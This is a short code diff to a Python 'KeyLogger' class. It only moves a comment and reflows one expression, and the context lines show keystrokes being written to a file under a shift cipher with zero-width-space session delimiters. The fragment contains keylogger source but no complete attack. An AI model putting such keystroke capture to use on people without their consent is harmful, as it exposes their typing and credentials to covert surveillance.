@@ -36,7 +36,7 @@ class KeyLogger:
         "offset": 11,
         "jumps": -1,
         "chars": 3,  # Set to at least the value of jumps
-        "delim": "\u200b",  # Delimeter between sessions
+        "delim": "\u200b",  # Delimeter between sessions. U+200B is a zero-width space
     }
 
     def __init__(
@@ -86,11 +86,7 @@ class KeyLogger:
         """
         with open(self.file_paths["recorded_keys"], "a+", encoding="utf-8") as file:
             file.write(
-                (
-                    KeyLogger.CONFIG["delim"]
-                    if not KeyLogger.START
-                    else ""  # U+200B is a zero-width space
-                )
+                (KeyLogger.CONFIG["delim"] if not KeyLogger.START else "")
                 + cipher_string(
                     "".join(map(self.translate_key, self.keys)),
                     KeyLogger.CONFIG["offset"],
